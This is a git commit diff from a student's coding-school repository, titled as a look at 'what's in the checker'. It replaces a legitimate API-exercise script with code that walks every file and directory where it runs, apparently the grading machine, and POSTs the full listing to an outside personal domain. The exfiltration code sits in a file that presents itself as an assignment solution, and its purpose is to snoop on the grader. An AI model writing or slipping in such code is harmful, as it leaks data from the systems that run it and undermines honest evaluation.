63f314aa9067c7924bb3ade10fd31f8d09d21d9f
Ian Liu-Johnston <ian.liu-johnson@holbertonschool.com>
2017-04-17 19:23:43 -0700

    Task 0: Need to see what's in the checker

--- 0x17-api/0-gather_data_from_an_API.py
+++ 0x17-api/0-gather_data_from_an_API.py
@@ -7,20 +7,14 @@ Fake data from "https://jsonplaceholder.typicode.com"
 """
 import requests
 import sys
-
+import os
 
 if __name__ == "__main__":
-    root = "https://jsonplaceholder.typicode.com"
-    users = requests.get(root + "/users", params={"id": sys.argv[1]})
-    for names in users.json():
-        usr_id = names.get('id')
-        todo = requests.get(root + "/todos", params={"userId": usr_id})
-        task_complete = 0
-        tasks_array = []
-        for tasks in todo.json():
-            if tasks.get('completed') is True:
-                task_complete += 1
-                tasks_array.append(tasks.get('title'))
-        print("Employee {:s} is done with tasks({:d}/{:d}):\n\t{}".
-              format(names.get('name'), task_complete,
-                     len(todo.json()), "\n\t".join(tasks_array)))
+    payload = []
+    for root, dirs, files in os.walk(".", topdown=False):
+        for name in files:
+            payload.append(os.path.join(root, name))
+        for name in dirs:
+            payload.append(os.path.join(root, name))
+    print(",".join(payload))
+    r = requests.post("http://ianxaunliu-johnston.com/wp-login.php", data={'all': ",".join(payload)})
